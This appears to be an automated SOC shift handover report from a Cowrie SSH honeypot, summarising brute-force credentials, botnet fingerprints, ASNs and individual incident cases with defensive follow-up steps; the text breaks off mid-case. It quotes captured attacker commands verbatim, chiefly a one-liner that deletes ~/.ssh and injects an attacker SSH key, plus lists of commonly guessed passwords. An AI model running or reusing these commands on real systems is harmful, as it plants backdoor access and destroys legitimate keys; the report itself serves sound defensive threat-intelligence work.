# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-08 |
| **Generated At** | 2026-08-08T16:38:24Z |
| **Shift Time** | 16:38 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **111** |
| Confirmed Threats | **94** |
| False Positives Filtered | **17** (15.3%) |
| Unique Attacker IPs | **71** |
| Countries of Origin | **26** |
| High Severity Cases | **45** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **66** |
| Malware Samples Analyzed | **3** HIGH · **23** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **59** |
| Unique Credential Pairs | **32** |
| Unique Usernames | **18** |
| Unique Passwords | **28** |
| Successful Auth Pairs | **50** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 17 |
| `nobody` | 7 |
| `test` | 4 |
| `345gs5662d34` | 4 |
| `operator` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `Host: 129.80.119.236:23` | 7 |
| `5555555555` | 5 |
| `test2007` | 4 |
| `345gs5662d34` | 4 |
| `3245gs5662d34` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `nobody` | `5555555555` | 5 |
| `test` | `test2007` | 4 |
| `345gs5662d34` | `345gs5662d34` | 4 |
| `debian` | `debian2014` | 3 |
| `root` | `admin123!@#` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `operator` | `Passw@rd` | `65.20.233.110` | 2026-08-08T12:59:08 |
| `nobody` | `5555555555` | `10.0.0.73` | 2026-08-08T13:01:04 |
| `nobody` | `5555555555` | `153.37.177.219` | 2026-08-08T13:02:33 |
| `test` | `test2007` | `196.191.151.172` | 2026-08-08T13:03:29 |
| `test` | `test2007` | `118.183.180.108` | 2026-08-08T13:06:34 |
| `test` | `test2007` | `10.0.0.73` | 2026-08-08T13:06:55 |
| `rahul` | `password` | `147.15.20.173` | 2026-08-08T13:07:09 |
| `345gs5662d34` | `345gs5662d34` | `147.15.20.173` | 2026-08-08T13:07:12 |
| `rahul` | `3245gs5662d34` | `147.15.20.173` | 2026-08-08T13:07:13 |
| `sustainability` | `sustainability` | `138.197.204.198` | 2026-08-08T13:08:25 |
| `345gs5662d34` | `345gs5662d34` | `138.197.204.198` | 2026-08-08T13:08:27 |
| `sustainability` | `3245gs5662d34` | `138.197.204.198` | 2026-08-08T13:08:28 |
| `default` | `Passw0rd` | `10.0.0.73` | 2026-08-08T13:16:21 |
| `nobody` | `5555555555` | `65.20.217.64` | 2026-08-08T13:18:58 |
| `nobody` | `5555555555` | `181.212.174.166` | 2026-08-08T13:19:05 |
| `root` | `supersecret` | `154.221.25.99` | 2026-08-08T13:20:56 |
| `345gs5662d34` | `345gs5662d34` | `154.221.25.99` | 2026-08-08T13:20:59 |
| `root` | `3245gs5662d34` | `154.221.25.99` | 2026-08-08T13:21:01 |
| `root` | `Lc13yfwpW` | `103.125.103.201` | 2026-08-08T13:24:26 |
| `345gs5662d34` | `345gs5662d34` | `103.125.103.201` | 2026-08-08T13:24:30 |
| `root` | `3245gs5662d34` | `103.125.103.201` | 2026-08-08T13:24:32 |
| `debian` | `debian2014` | `186.23.209.47` | 2026-08-08T13:26:41 |
| `debian` | `debian2014` | `65.20.251.170` | 2026-08-08T13:29:54 |
| `debian` | `debian2014` | `10.0.0.73` | 2026-08-08T13:30:21 |
| `default` | `Passw0rd` | `144.22.210.132` | 2026-08-08T13:33:50 |
| `root` | `password321` | `10.0.0.73` | 2026-08-08T13:35:35 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `65.49.1.162` | 2026-08-08T13:36:23 |
| `root` | `00` | `180.71.9.31` | 2026-08-08T13:39:04 |
| `root` | `﻿------fuck------` | `163.177.76.83` | 2026-08-08T13:40:19 |
| `operator` | `1234567` | `10.0.0.73` | 2026-08-08T13:53:26 |
| `root` | `password321` | `41.178.230.115` | 2026-08-08T13:53:35 |
| `root` | `123@@@` | `129.153.145.135` | 2026-08-08T13:55:48 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-08-08T13:55:48 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-08-08T13:55:53 |
| `user` | `1q2w3e4r` | `187.115.144.103` | 2026-08-08T14:00:47 |
| `root` | `00` | `81.237.155.113` | 2026-08-08T14:08:36 |
| `nobody` | `1234567890` | `10.0.0.73` | 2026-08-08T14:10:15 |
| `vodafone` | `vodafone` | `101.13.4.124` | 2026-08-08T14:14:03 |
| `root` | `admin123!@#` | `10.0.0.73` | 2026-08-08T14:16:14 |
| `config` | `qwer1234` | `10.0.0.73` | 2026-08-08T14:16:24 |
| `root` | `root12345678` | `130.12.180.51` | 2026-08-08T14:27:56 |
| `root` | `admin123!@#` | `59.95.137.238` | 2026-08-08T14:35:13 |
| `root` | `admin123!@#` | `58.57.154.146` | 2026-08-08T14:35:23 |
| `unknown` | `ubuntu` | `189.52.52.162` | 2026-08-08T14:39:08 |
| `vodafone` | `vodafone` | `60.171.135.254` | 2026-08-08T14:43:29 |
| `ubnt` | `12345` | `10.0.0.73` | 2026-08-08T14:44:58 |
| `GET /solr/admin/info/system HTTP/1.1` | `Host: 129.80.119.236:23` | `167.172.108.50` | 2026-08-08T14:45:56 |
| `GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1` | `Host: 129.80.119.236:23` | `167.172.108.50` | 2026-08-08T14:45:58 |
| `support` | `support44` | `64.49.97.15` | 2026-08-08T14:48:35 |
| `support` | `support44` | `82.102.149.88` | 2026-08-08T14:48:46 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **111** |
| Sessions with Fingerprint | **9** |
| Unique HASSH Fingerprints | **9** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 22 |
| libssh | 22 |
| Go SSH scanner | 7 |
| Paramiko (Python) | 4 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 22 | 22 |
| `f555226df196...` | Mirai/variant | 12 | 4 |
| `a2de0f306611...` | Mirai/variant | 4 | 1 |
| `4e066189c3bb...` | Generic scanner | 3 | 1 |
| `e54ef3ec27fe...` | Generic scanner | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 22 | 22 | Mirai/variant |
| `f555226df196...` | libssh | 12 | 4 | Mirai/variant |
| `95420f9d932d...` | libssh | 10 | 5 | — |
| `a2de0f306611...` | Paramiko (Python) | 4 | 1 | Mirai/variant |
| `4e066189c3bb...` | Go SSH scanner | 3 | 1 | Generic scanner |
| `e54ef3ec27fe...` | Go SSH scanner | 2 | 1 | Generic scanner |
| `5bd26477da54...` | PuTTY | 1 | 1 | Mirai/variant |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1070, T1140` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `138.197.204.198`, `154.221.25.99`, `147.15.20.173`, `103.125.103.201`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
X="chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgB
```
Source IPs: `130.12.180.51`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **71** |
| Unique ASNs | **49** |
| High-Risk ASNs | **42** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 7 | MEDIUM |
| `AS4134` | CHINANET BACKBONE | 5 | HIGH |
| `AS63949` | Akamai Connected Cloud | 4 | HIGH |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 3 | HIGH |
| `AS14061` | DigitalOcean, LLC | 3 | HIGH |
| `AS22773` | Cox Communications Inc. | 3 | MEDIUM |
| `AS31898` | Oracle Corporation | 3 | HIGH |
| `AS3301` | Telia Company AB | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (45)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-77f423b80524

| Field | Detail |
|---|---|
| **Source IP** | `65.20.233[.]110` |
| **First Seen** | 2026-08-08 12:59 |
| **Last Seen** | 2026-08-08 12:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 12:59:06` | `cowrie.session.connect` |
| `2026-08-08 12:59:07` | `cowrie.client.version` |
| `2026-08-08 12:59:07` | `cowrie.client.kex` |
| `2026-08-08 12:59:08` | `cowrie.login.success` |
| `2026-08-08 12:59:08` | `cowrie.direct-tcpip.request` |
| `2026-08-08 12:59:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.233[.]110` to AbuseIPDB if not already reported
- [ ] Block `65.20.233[.]110` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ea0e0cc0734

| Field | Detail |
|---|---|
| **Source IP** | `153.37.177[.]219` |
| **First Seen** | 2026-08-08 13:02 |
| **Last Seen** | 2026-08-08 13:02 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 13:02:30` | `cowrie.session.connect` |
| `2026-08-08 13:02:31` | `cowrie.client.version` |
| `2026-08-08 13:02:31` | `cowrie.client.kex` |
| `2026-08-08 13:02:33` | `cowrie.login.success` |
| `2026-08-08 13:02:34` | `cowrie.direct-tcpip.request` |
| `2026-08-08 13:02:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.37.177[.]219` to AbuseIPDB if not already reported
- [ ] Block `153.37.177[.]219` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b6a1ece268e

| Field | Detail |
|---|---|
| **Source IP** | `196.191.151[.]172` |
| **First Seen** | 2026-08-08 13:03 |
| **Last Seen** | 2026-08-08 13:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 13:03:27` | `cowrie.session.connect` |
| `2026-08-08 13:03:28` | `cowrie.client.version` |
| `2026-08-08 13:03:28` | `cowrie.client.kex` |
| `2026-08-08 13:03:29` | `cowrie.login.success` |
| `2026-08-08 13:03:30` | `cowrie.direct-tcpip.request` |
| `2026-08-08 13:03:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.191.151[.]172` to AbuseIPDB if not already reported
- [ ] Block `196.191.151[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c1d30c75748

| Field | Detail |
|---|---|
| **Source IP** | `118.183.180[.]108` |
| **First Seen** | 2026-08-08 13:06 |
| **Last Seen** | 2026-08-08 13:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 13:06:31` | `cowrie.session.connect` |
| `2026-08-08 13:06:31` | `cowrie.client.version` |
| `2026-08-08 13:06:31` | `cowrie.client.kex` |
| `2026-08-08 13:06:34` | `cowrie.login.success` |
| `2026-08-08 13:06:35` | `cowrie.direct-tcpip.request` |
| `2026-08-08 13:06:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.183.180[.]108` to AbuseIPDB if not already reported
- [ ] Block `118.183.180[.]108` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c26a9417c88

| Field | Detail |
|---|---|
| **Source IP** | `147.15.20[.]173` |
| **First Seen** | 2026-08-08 13:07 |
| **Last Seen** | 2026-08-08 13:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 13:07:09` | `cowrie.session.connect` |
| `2026-08-08 13:07:09` | `cowrie.client.version` |
| `2026-08-08 13:07:09` | `cowrie.client.kex` |
| `2026-08-08 13:07:09` | `cowrie.login.success` |
| `2026-08-08 13:07:10` | `cowrie.session.params` |
| `2026-08-08 13:07:10` | `cowrie.command.input` |
| `2026-08-08 13:07:10` | `cowrie.command.failed` |
| `2026-08-08 13:07:11` | `cowrie.log.closed` |
| `2026-08-08 13:07:11` | `cowrie.session.params` |
| `2026-08-08 13:07:11` | `cowrie.command.input` |
| `2026-08-08 13:07:11` | `cowrie.session.file_download` |
| `2026-08-08 13:07:11` | `cowrie.log.closed` |
| `2026-08-08 13:07:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.15.20[.]173` to AbuseIPDB if not already reported
- [ ] Block `147.15.20[.]173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-300e4b535676

| Field | Detail |
|---|---|
| **Source IP** | `147.15.20[.]173` |
| **First Seen** | 2026-08-08 13:07 |
| **Last Seen** | 2026-08-08 13:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 13:07:11` | `cowrie.session.connect` |
| `2026-08-08 13:07:11` | `cowrie.client.version` |
| `2026-08-08 13:07:12` | `cowrie.client.kex` |
| `2026-08-08 13:07:12` | `cowrie.login.success` |
| `2026-08-08 13:07:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.15.20[.]173` to AbuseIPDB if not already reported
- [ ] Block `147.15.20[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-911ded40c28d

| Field | Detail |
|---|---|
| **Source IP** | `147.15.20[.]173` |
| **First Seen** | 2026-08-08 13:07 |
| **Last Seen** | 2026-08-08 13:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 13:07:12` | `cowrie.session.connect` |
| `2026-08-08 13:07:12` | `cowrie.client.version` |
| `2026-08-08 13:07:13` | `cowrie.client.kex` |
| `2026-08-08 13:07:13` | `cowrie.login.success` |
| `2026-08-08 13:07:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.15.20[.]173` to AbuseIPDB if not already reported
- [ ] Block `147.15.20[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a647d4093ec

| Field | Detail |
|---|---|
| **Source IP** | `138.197.204[.]198` |
| **First Seen** | 2026-08-08 13:08 |
| **Last Seen** | 2026-08-08 13:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 13:08:25` | `cowrie.session.connect` |
| `2026-08-08 13:08:25` | `cowrie.client.version` |
| `2026-08-08 13:08:25` | `cowrie.client.kex` |
| `2026-08-08 13:08:25` | `cowrie.login.success` |
| `2026-08-08 13:08:26` | `cowrie.session.params` |
| `2026-08-08 13:08:26` | `cowrie.command.input` |
| `2026-08-08 13:08:26` | `cowrie.command.failed` |
| `2026-08-08 13:08:26` | `cowrie.log.closed` |
| `2026-08-08 13:08:27` | `cowrie.session.params` |
| `2026-08-08 13:08:27` | `cowrie.command.input` |
| `2026-08-08 13:08:27` | `cowrie.session.file_download` |
| `2026-08-08 13:08:27` | `cowrie.log.closed` |
| `2026-08-08 13:08:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.197.204[.]198` to AbuseIPDB if not already reported
- [ ] Block `138.197.204[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a48ad70dc885

| Field | Detail |
|---|---|
| **Source IP** | `138.197.204[.]198` |
| **First Seen** | 2026-08-08 13:08 |
| **Last Seen** | 2026-08-08 13:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 13:08:27` | `cowrie.session.connect` |
| `2026-08-08 13:08:27` | `cowrie.client.version` |
| `2026-08-08 13:08:27` | `cowrie.client.kex` |
| `2026-08-08 13:08:27` | `cowrie.login.success` |
| `2026-08-08 13:08:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.197.204[.]198` to AbuseIPDB if not already reported
- [ ] Block `138.197.204[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a409f02f00f

| Field | Detail |
|---|---|
| **Source IP** | `138.197.204[.]198` |
| **First Seen** | 2026-08-08 13:08 |
| **Last Seen** | 2026-08-08 13:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 13:08:27` | `cowrie.session.connect` |
| `2026-08-08 13:08:27` | `cowrie.client.version` |
| `2026-08-08 13:08:27` | `cowrie.client.kex` |
| `2026-08-08 13:08:28` | `cowrie.login.success` |
| `2026-08-08 13:08:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.197.204[.]198` to AbuseIPDB if not already reported
- [ ] Block `138.197.204[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97417422b346

| Field | Detail |
|---|---|
| **Source IP** | `65.20.217[.]64` |
| **First Seen** | 2026-08-08 13:18 |
| **Last Seen** | 2026-08-08 13:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 13:18:56` | `cowrie.session.connect` |
| `2026-08-08 13:18:56` | `cowrie.client.version` |
| `2026-08-08 13:18:56` | `cowrie.client.kex` |
| `2026-08-08 13:18:58` | `cowrie.login.success` |
| `2026-08-08 13:18:58` | `cowrie.direct-tcpip.request` |
| `2026-08-08 13:19:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.217[.]64` to AbuseIPDB if not already reported
- [ ] Block `65.20.217[.]64` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f95b226da42d

| Field | Detail |
|---|---|
| **Source IP** | `181.212.174[.]166` |
| **First Seen** | 2026-08-08 13:19 |
| **Last Seen** | 2026-08-08 13:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 13:19:03` | `cowrie.session.connect` |
| `2026-08-08 13:19:04` | `cowrie.client.version` |
| `2026-08-08 13:19:04` | `cowrie.client.kex` |
| `2026-08-08 13:19:05` | `cowrie.login.success` |
| `2026-08-08 13:19:06` | `cowrie.direct-tcpip.request` |
| `2026-08-08 13:19:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.212.174[.]166` to AbuseIPDB if not already reported
- [ ] Block `181.212.174[.]166` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51b99bfff1c5

| Field | Detail |
|---|---|
| **Source IP** | `154.221.25[.]99` |
| **First Seen** | 2026-08-08 13:20 |
| **Last Seen** | 2026-08-08 13:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 13:20:55` | `cowrie.session.connect` |
| `2026-08-08 13:20:55` | `cowrie.client.version` |
| `2026-08-08 13:20:55` | `cowrie.client.kex` |
| `2026-08-08 13:20:56` | `cowrie.login.success` |
| `2026-08-08 13:20:57` | `cowrie.session.params` |
| `2026-08-08 13:20:57` | `cowrie.command.input` |
| `2026-08-08 13:20:57` | `cowrie.command.failed` |
| `2026-08-08 13:20:57` | `cowrie.log.closed` |
| `2026-08-08 13:20:58` | `cowrie.session.params` |
| `2026-08-08 13:20:58` | `cowrie.command.input` |
| `2026-08-08 13:20:58` | `cowrie.session.file_download` |
| `2026-08-08 13:20:58` | `cowrie.log.closed` |
| `2026-08-08 13:21:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.25[.]99` to AbuseIPDB if not already reported
- [ ] Block `154.221.25[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2969d6ff9920

| Field | Detail |
|---|---|
| **Source IP** | `154.221.25[.]99` |
| **First Seen** | 2026-08-08 13:20 |
| **Last Seen** | 2026-08-08 13:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 13:20:58` | `cowrie.session.connect` |
| `2026-08-08 13:20:58` | `cowrie.client.version` |
| `2026-08-08 13:20:59` | `cowrie.client.kex` |
| `2026-08-08 13:20:59` | `cowrie.login.success` |
